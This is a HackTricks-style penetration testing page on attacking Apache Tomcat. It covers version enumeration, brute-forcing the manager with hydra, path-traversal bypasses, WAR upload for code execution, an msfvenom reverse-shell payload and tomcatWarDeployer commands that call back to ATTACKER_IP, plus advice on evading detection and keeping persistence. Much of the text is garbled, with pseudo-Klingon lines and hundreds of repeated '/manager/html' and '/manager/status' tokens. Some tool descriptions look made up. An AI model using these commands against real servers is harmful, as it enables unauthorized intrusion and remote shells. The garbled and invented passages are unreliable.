# Tomcat

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Discovery

* It usually runs on **port 8080**
* **Common Tomcat error:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### **Version Identification**
To find the version of Apache Tomcat, a simple command can be executed:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
### **Manager Files Location**
Identifying the exact locations of **`/manager`** and **`/host-manager`** directories is crucial as their names might be altered. A brute-force search is recommended to locate these pages.

### **Username Enumeration**
For Tomcat versions older than 6, it's possible to enumerate usernames through:

### **tlhIngan Hol translation:**

### **QaHbe'wI' De'wI'**
**`/manager`** je **`/host-manager`** qutlh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh pagh
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Default Credentials**
**`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`** **`/manager/html`**
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
**`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`** **`/manager/status`
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
## Common Vulnerabilities

### **Password Backtrace Disclosure**
`/auth.jsp` jopwI' backtrace vItlhutlh.

### **Double URL Encoding**
`mod_jk` vulnerability CVE-2007-1860 allows for double URL encoding path traversal, enabling unauthorized access to the management interface via a specially crafted URL.

In order to access to the management web of the Tomcat go to: `pathTomcat/%252E%252E/manager/html`

### /examples
Apache Tomcat versions 4.x to 7.x include example scripts that are susceptible to information disclosure and cross-site scripting (XSS) attacks. These scripts, listed comprehensively, should be checked for unauthorized access and potential exploitation. Find [more info here](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Path Traversal Exploit**
[**vulnerable configurations of Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) vItlhutlh, `/..;/` path vItlhutlh protected directories in Tomcat.

So, for example, you might be able to **access the Tomcat manager** page by accessing: `www.vulnerable.com/lalala/..;/manager/html`

**Another way** to bypass protected paths using this trick is to access `http://www.vulnerable.com/;param=value/manager/html`


## RCE

Finally, if you have access to the Tomcat Web Application Manager, you can **upload and deploy a .war file (execute code)**.

### Limitations

You will only be able to deploy a WAR if you have **enough privileges** (roles: **admin**, **manager** and **manager-script**). Those details can be find under _tomcat-users.xml_ usually defined in `/usr/share/tomcat9/etc/tomcat-users.xml` (it vary between versions) (see [POST ](tomcat.md#post)section).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit is a powerful framework for penetration testing and exploiting vulnerabilities in various systems and applications. It provides a wide range of tools and modules that can be used to identify and exploit security weaknesses.

Metasploit is written in Ruby and is available as an open-source project. It offers both a command-line interface (CLI) and a graphical user interface (GUI) called Armitage.

With Metasploit, you can perform various tasks such as scanning for open ports, identifying vulnerable services, and launching exploits. It also includes a database that can be used to store and manage information about targets, vulnerabilities, and exploits.

Metasploit supports a wide range of exploits, payloads, and auxiliary modules. Exploits are used to take advantage of specific vulnerabilities, while payloads are used to deliver malicious code to the target system. Auxiliary modules provide additional functionality, such as scanning and fingerprinting.

Metasploit also includes features for post-exploitation activities, such as privilege escalation, lateral movement, and data exfiltration. It allows you to pivot through compromised systems and maintain access to the target network.

Overall, Metasploit is a versatile and powerful tool for penetration testing and exploiting vulnerabilities. It is widely used by security professionals and hackers alike for assessing the security of systems and applications.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. Create the war to deploy:

### MSFVenom qeylIS

1. war yIlo' deploy:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. `revshell.war` file jImej 'oH vItlhutlh (`/revshell/`) je:

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer) vIleghlaH 'ej vItlhutlh

vaj 'e' vItlhutlh (tlhIngan Hol: 'ejmey sun) vItlhutlh.
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Qa'Hom 'ej Qa'Hom

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands on it.

To establish a reverse shell, the attacker needs to set up a listener on their machine and then exploit a vulnerability on the target machine to execute a reverse shell payload. Once the payload is executed, it connects back to the attacker's machine, providing them with a shell session.

There are various ways to create a reverse shell, depending on the target machine's operating system and the available tools. Some common methods include using netcat, socat, or a dedicated reverse shell tool like `msfvenom` from the Metasploit Framework.

When setting up a reverse shell, it is important to consider the following:

- **Port**: Choose a port that is not blocked by firewalls or monitored by network security tools.
- **Payload**: Use a payload that is compatible with the target machine's operating system and architecture.
- **Encryption**: If possible, encrypt the communication between the target machine and the attacker's machine to avoid detection.
- **Persistence**: Implement persistence mechanisms to maintain access to the target machine even after a reboot.

Remember that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized system administration tasks.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind shell

A bind shell is a type of shell that allows an attacker to gain remote access to a target system. It works by binding a shell to a specific port on the target system, allowing the attacker to connect to that port and gain control over the system.

To create a bind shell, the attacker needs to have a listening shell on their own machine and a way to execute commands on the target system. Once the bind shell is established, the attacker can use the listening shell to execute commands on the target system and interact with it as if they were sitting in front of it.

Bind shells are commonly used in network penetration testing to gain unauthorized access to a target system and perform various malicious activities. It is important for system administrators to be aware of the existence of bind shells and take appropriate measures to protect their systems from such attacks.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### [Culsterd](https://github.com/hatRiot/clusterd) vIghoS

Culsterd is a tool designed to exploit vulnerabilities in Apache Tomcat servers. It provides a set of modules that can be used to perform various attacks, such as remote code execution, file upload, and information disclosure.

#### Installation

To install Culsterd, you can clone the repository from GitHub:

```
git clone https://github.com/hatRiot/clusterd.git
```

#### Usage

Once you have Culsterd installed, you can use it to exploit vulnerabilities in Tomcat servers. Culsterd provides a command-line interface that allows you to interact with its modules.

To start Culsterd, navigate to the `clusterd` directory and run the following command:

```
./clusterd.py
```

This will display the Culsterd command prompt, where you can enter commands to interact with the tool.

#### Modules

Culsterd provides several modules that can be used to exploit different vulnerabilities in Tomcat servers. Some of the modules include:

- `tomcat_rce`: This module allows you to execute arbitrary commands on the target server.
- `tomcat_file_upload`: This module allows you to upload files to the target server.
- `tomcat_info_disclosure`: This module allows you to gather information about the target server, such as version numbers and configuration details.

To use a module, you can use the `use` command followed by the module name. For example, to use the `tomcat_rce` module, you can run the following command:

```
use tomcat_rce
```

